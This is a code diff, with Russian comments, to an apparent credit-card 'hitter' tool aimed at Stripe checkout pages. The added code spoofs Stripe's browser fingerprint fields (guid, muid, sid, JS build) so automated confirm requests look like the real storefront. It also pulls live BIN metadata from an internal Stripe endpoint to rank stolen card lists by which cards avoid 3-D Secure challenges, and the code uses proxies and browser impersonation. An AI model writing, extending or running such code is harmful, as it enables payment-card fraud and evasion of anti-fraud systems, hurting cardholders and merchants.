@@ -707,7 +707,15 @@ class CsHitSession:
             "expected_payment_method_type": "card",
             "expected_amount": str(self.expected_amount or self.amount),
             "return_url": self.url.split("#")[0],
+            # Идентификаторы клиента и версия JS — ровно те поля, что шлёт сама витрина
+            # (живая съёмка 2026-09-13: guid/muid/sid и version=f0a6d7cfcd). Без них наш confirm
+            # отличался от страницы по набору полей; guid теперь настоящий (m.stripe.com/6).
+            "version": config.STRIPE_JS_BUILD,
         }
+        if telem:
+            for src, dst in (("guid", "guid"), ("muid", "muid"), ("sid", "sid")):
+                if telem.get(src):
+                    body[dst] = str(telem[src])
         if self.hcaptcha_token and getattr(config, "CONFIRM_SEND_RADAR_OPTIONS", False):
             body["radar_options[hcaptcha_token]"] = self.hcaptcha_token
         if self.checksum:
@@ -910,7 +918,17 @@ async def execute_hit(target_url: str, cards: list, proxy: str | None = None,
         }
 
     engine = bin_steering.BinSteeringEngine()
-    queue = await engine.split_queue(cards)
+    # Живые данные о BIN от Stripe (бесплатно, по конкретной цели) — приоритетнее кэша таблиц.
+    live_meta: dict = {}
+    if getattr(gs, "s", None) is not None and getattr(gs, "pk", ""):
+        try:
+            live_meta = await gc.live_bin_metadata(gs.s, gs.pk, cards)
+            if live_meta:
+                _log.log_stripe("BIN_LIVE", gs.cs[:14], f"{len(live_meta)} BIN",
+                                "данные Stripe edge-internal/card-metadata")
+        except Exception as e:
+            _log.log_stripe("BIN_LIVE", gs.cs[:14], "fallback", type(e).__name__)
+    queue = await engine.split_queue(cards, live_meta=live_meta)
     ordered_cards = []
     for cat in (bin_steering.ThreeDsCategory.DIRECT_CHECKOUT,
                 bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE,
@@ -1048,7 +1066,19 @@ async def main():
 
     # Предварительная оценка и приоритизация пула карт через BinSteeringEngine
     engine = bin_steering.BinSteeringEngine()
-    queue = await engine.split_queue(cards)
+    # Живые данные о BIN (Stripe edge-internal/card-metadata) нужны ДО сортировки, а сессия
+    # создаётся позже — поэтому берём pk из ссылки и ходим отдельным коротким соединением.
+    live_meta = {}
+    try:
+        pk_cli, _cs_cli = extract_session_and_key(target)
+        if pk_cli:
+            async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as _s:
+                live_meta = await gc.live_bin_metadata(_s, pk_cli, cards)
+    except Exception:
+        live_meta = {}
+    if live_meta:
+        print(f"[*] Живые данные о BIN от Stripe: {len(live_meta)} шт.")
+    queue = await engine.split_queue(cards, live_meta=live_meta)
     _log.log_hit(f"BIN STEERING queue: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
                  f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
                  f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
